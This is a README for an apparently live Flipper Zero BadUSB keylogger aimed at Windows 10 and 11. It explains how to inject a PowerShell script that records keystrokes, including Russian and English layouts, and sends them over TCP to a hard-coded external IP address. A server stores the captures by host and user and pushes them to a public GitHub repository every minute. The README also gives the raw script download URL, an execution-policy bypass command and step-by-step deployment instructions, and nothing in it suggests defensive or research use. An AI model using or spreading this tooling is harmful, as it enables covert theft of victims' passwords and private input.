# flipper-keylogger (Windows 10 / 11)

Flipper Zero BadUSB loads `keylogger.ps1` from this repo and sends keystrokes to **89.22.229.54:4444** (TCP).

Target: **Windows 10 and Windows 11**, Windows PowerShell **5.1** (built-in). No admin required.

## GitHub captures (every minute)

```text
captures/{host}/{user}/{YYYY-MM-DD}/{HH-MM}.txt
```

- One folder per machine host, per Windows user
- One file per UTC minute (appended during that minute)
- VPS cron runs `server/github_sync.sh` every minute → push to this repo
- Old `live.log` imported under `captures/_migrated/legacy/`

## Language

`keylogger.ps1` uses **foreground window HKL** + `ToUnicodeEx` + `GetKeyboardState` so RU/EN (and other layouts) resolve to real characters. Layout switches appear as `[LANG:0419|ru-RU]`.

| File | Role |
|------|------|
| `keylogger.ps1` | Language-aware keys + meta packets + TCP |
| `payload.txt` | BadUSB injector (3s delays) |
| `payload_enc.txt` | Encoded alternate injector |
| `server/receiver.py` | TCP → captures tree + live.log |
| `server/github_sync.sh` | Minute sync to GitHub |
| `captures/` | Synced keylog files |

## Raw URL

```
https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1
```

## Server

```bash
cd server
python3 receiver.py
# ufw allow 4444/tcp
# tail -f /opt/kl-recv/logs/live.log
```

## Flipper

1. Copy `payload.txt` → SD `badusb/`
2. Target: logged-in Win10/11, network on, layout **EN** for BadUSB typing
3. BadUSB → Run

All `DELAY` = **3000** ms for error screenshots.

## Local test

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -File .\keylogger.ps1
```

## Config

Top of `keylogger.ps1`: `$ServerIP`, `$ServerPort`, `$FlushEvery`, `$TimerMs`.

## Offline buffer

`%TEMP%\kl.buf` if TCP fails; retried every `$TimerMs`.
